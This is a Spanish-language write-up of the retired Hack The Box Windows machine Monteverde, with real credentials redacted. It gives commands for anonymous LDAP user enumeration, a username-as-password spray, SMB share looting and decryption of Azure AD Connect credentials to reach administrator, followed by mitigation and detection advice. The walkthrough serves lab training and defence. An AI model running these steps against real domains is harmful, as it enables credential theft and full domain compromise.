---
machine: Monteverde
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, active-directory, azure-ad-connect, ldap, smb, winrm]
---

# Monteverde — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags, hashes ni credenciales reales.

## TL;DR

Un bind LDAP anónimo lista todos los usuarios. Un spray `usuario=contraseña` compromete `SABatchJobs`, que accede a un recurso SMB con `azure.xml` y la contraseña de `mhope`. `mhope` pertenece a `Azure Admins` y el DC tiene Azure AD Connect; la base de datos `ADSync` guarda las credenciales del administrador de forma reversible.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p53,88,135,139,389,445,5985,9389 <IP>
```

Se añade `monteverde.htb` al hosts. El bind LDAP anónimo está permitido:

```bash
ldapsearch -x -H ldap://<IP> -b 'DC=monteverde,DC=htb' '(objectClass=user)' sAMAccountName
```

Se obtiene la lista de usuarios. Se prueba `usuario:usuario` contra SMB/WinRM:

```bash
crackmapexec smb <IP> -u users.txt -p users.txt --no-brute
```

## Acceso inicial

La cuenta `SABatchJobs` reutiliza su nombre como contraseña. Se enumeran recursos SMB:

```bash
smbclient -L //<IP> -U 'SABatchJobs%<PASS>'
smbclient //<IP>/users$ -U 'SABatchJobs%<PASS>'
```

En `users$\mhope\azure.xml` hay credenciales en texto claro. Se usa WinRM:

```bash
evil-winrm -i <IP> -u mhope -p '<PASS>'
```

## Escalada a administrador

```powershell
whoami /groups
# Azure Admins
```

Azure AD Connect está instalado en el DC. La base de datos `ADSync` contiene las credenciales cifradas de la cuenta `MSOL_*`. Se usa un script público de descifrado (por ejemplo `AdDecrypt.exe` o `azuread_decrypt_msol.ps1`) con las claves del servicio:

```powershell
.\AdDecrypt.exe -Server <DC> -User <MSOL_USER> -Password '<MSOL_PASS>'
```

Se obtiene la contraseña del administrador. Se inicia sesión por WinRM y se lee la flag. Se redacta.

## Evidencia

- Bind LDAP anónimo y lista de usuarios redactada.
- Spray y acceso SMB a `users$`.
- `azure.xml` con contraseña redactada.
- `whoami /groups` y salida de `AdDecrypt` redactada.

## Lecciones aprendidas

- Un bind LDAP anónimo facilita el spray.
- Contraseñas iguales al usuario siguen siendo efectivas.
- Un XML de configuración puede contener credenciales en claro.
- Azure AD Connect almacena secretos reversibles en `ADSync`.

## Mitigación y detección

- Deshabilitar bind LDAP anónimo.
- Aplicar contraseñas fuertes y MFA; bloquear spray.
- Restringir lectura de `users$` y proteger `azure.xml`.
- Limitar `Azure Admins` y auditar el acceso a `ADSync`.
- Detectar consultas LDAP masivas y accesos a `ADSync.mdf`.

## Referencias

- <https://www.hackthebox.com/machines/monteverde>
- <https://learn.microsoft.com/en-us/azure/active-directory/hybrid/>
- <https://attack.mitre.org/techniques/T1110/003/>
